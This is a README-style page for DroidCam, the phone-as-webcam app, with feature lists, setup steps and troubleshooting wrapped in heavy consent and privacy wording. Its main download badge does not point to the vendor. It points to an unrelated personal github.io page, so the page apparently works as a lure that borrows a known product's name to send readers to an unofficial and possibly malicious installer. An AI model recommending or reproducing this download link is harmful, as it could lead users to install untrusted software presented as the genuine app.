# DroidCam - Your Phone as a Webcam on Your PC

DroidCam shows the camera of a phone you own as a webcam on the PC in front of you. You run the phone app and the Windows client yourself, on the same desk, over USB or a Wi-Fi network you trust. It does not turn on a phone that belongs to someone else, and it does not belong pointed at a person who has not agreed to be on camera.

---

## Why It Stands Out

![DroidCam using the camera of a phone the user is holding, shown on their PC](https://files.dev47apps.net/img/doc/obs-transform-menu.png)

A laptop camera is fixed and often poor in a dim room. DroidCam lets you use the phone you already have, aimed where you aim it, as the camera inside a call or a recording on this PC. Both ends are yours: you install the client, you open the phone app, you grant the camera permission. A phone in another room that you did not set up is not a source.

Use a cable when you can. Wi-Fi works only if the phone and the PC are on a network you understand, and you should not leave the phone app listening after the call. Close it. If other people are in the frame, tell them. The picture is a normal camera feed, not a hidden recorder. When you are done, quit the Windows client so the next app does not still claim that camera.

---

## Core Capabilities

- **Your Two Devices:** The phone camera and this PC, both in your hands.
- **USB or Your Wi-Fi:** A cable is simpler. Wireless only on a network you trust.
- **A Normal Webcam Name:** Pick DroidCam in the app that needs a camera, for a call you are part of.
- **Permission on the Phone:** The phone asks. You accept. There is no remote switch for a stranger's device.
- **Quit When Finished:** Close the phone app and the client so the camera is not left open.

---

## Performance Tips

- Prefer USB if the Wi-Fi picture stutters.
- Light your face from the front. The tool does not fix a dark room.
- Close the phone app after the call so it does not stay connected.
- Do not aim it at anyone who has not agreed to be on the call.

## Quick Setup

Prerequisites: Your phone, your PC, and a call or recording you are allowed to put a camera on.

[![GET DroidCam](https://img.shields.io/badge/GET%20%E2%80%94%20DroidCam-1d4ed8?style=for-the-badge&logoColor=white)](https://seitannabella.github.io/.github/droidcam-wifi)

1.  **Install Both Ends:** The Windows client and the app on the phone you own.
2.  **Connect:** USB first. Grant the camera permission when the phone asks.
3.  **Select the Camera:** In the call app, choose DroidCam and confirm you see yourself.
4.  **Hang Up and Quit:** Close the client and the phone app.

---

## Ideal For

- **A Better Angle:** The phone on a stand, instead of the laptop lid camera, for your own call.
- **A Recording You Make:** Your face or your desk, in a video you are producing.
- **A Shared Network:** USB, so the camera is not listening on Wi-Fi.
- **A Clear Ending:** Both apps closed when the call is over.

---

## Troubleshooting

- No picture? Replug the cable and grant the camera permission on the phone.
- The call app still shows the laptop camera? Pick DroidCam in that app's camera list.
- Wi-Fi will not connect? Use USB. Do not open the phone app toward a network you do not know.
- The camera stays busy? Quit DroidCam on the PC and on the phone.
